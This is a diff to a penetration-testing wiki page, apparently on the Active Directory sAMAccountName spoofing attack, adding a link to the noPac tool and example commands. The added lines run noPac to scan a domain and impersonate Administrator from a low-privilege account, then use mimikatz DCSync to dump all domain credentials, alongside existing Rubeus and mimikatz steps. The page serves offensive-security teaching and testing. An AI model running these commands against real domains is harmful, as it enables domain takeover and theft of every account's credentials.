@@ -46,6 +46,7 @@ At the time of writing (10th of December, 2021), the tools and features that all
 * Impacket's getST: [https://github.com/SecureAuthCorp/impacket/pull/1202](https://github.com/SecureAuthCorp/impacket/pull/1202)
 * Impacket's renameMachine: [https://github.com/SecureAuthCorp/impacket/pull/1224](https://github.com/SecureAuthCorp/impacket/pull/1224)
 * krbrelayx's addspn: [https://github.com/dirkjanm/krbrelayx/pull/20](https://github.com/dirkjanm/krbrelayx/pull/20)
+* noPac (from cube0x0): [https://github.com/cube0x0/noPac](https://github.com/cube0x0/noPac)
 {% endhint %}
 
 {% tabs %}
@@ -112,6 +113,14 @@ Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainCont
 
 # 6. DCSync
 (mimikatz) lsadump::dcsync /domain:domain.local /kdc:DomainController.domain.local /user:krbtgt 
+```
+
+[noPac](https://github.com/cube0x0/noPac) (C#) is an automated alternative
+
+```powershell
+noPac.exe scan -domain domain.local -user "lowpriv" -pass "lowpriv"
+noPac.exe -domain mcafeelab.local -user "lowpriv" -pass "lowpriv" /dc dc.domain.local /mAccount pillemann11 /mPassword pilleman11 /service ldaps /ptt /impersonate Administrator
+(mimikatz) lsadump::dcsync /domain:mcafeelab.local /all
 ```
 {% endtab %}
 {% endtabs %}
